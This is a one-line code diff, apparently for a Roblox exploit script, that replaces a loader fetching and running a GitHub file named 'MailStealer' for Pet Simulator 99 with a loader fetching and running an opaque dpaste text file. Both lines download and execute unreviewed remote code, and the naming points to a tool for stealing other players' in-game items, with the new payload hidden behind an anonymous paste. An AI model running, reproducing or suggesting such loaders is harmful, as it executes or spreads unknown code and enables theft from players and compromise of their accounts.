@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/darkio-script/PS99_Mailstealer/main/MailStealer.lua"))()
+loadstring(game:HttpGet("https://dpaste.com/76GZQC2ZR.txt", true))()
